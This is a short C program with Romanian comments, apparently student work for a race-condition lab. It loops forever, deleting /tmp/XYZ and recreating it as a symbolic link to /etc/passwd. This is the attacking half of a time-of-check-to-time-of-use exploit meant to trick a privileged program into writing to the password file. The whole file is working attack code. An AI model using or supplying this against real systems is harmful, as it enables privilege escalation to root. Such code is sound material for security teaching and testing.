#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(){
    //creez o bucla infinta care va face unlink la tmp/XYZ iar apoi il 
    //va adauga ca legatura simbolica la /etc/passwd
   for(int i=0;; i++){
    unlink("/tmp/XYZ");
    symlink("/etc/passwd","/tmp/XYZ");
    printf("Run symlink for %d times\n",i); //printam numarul de iteratii facute
   }

    return 0;
}
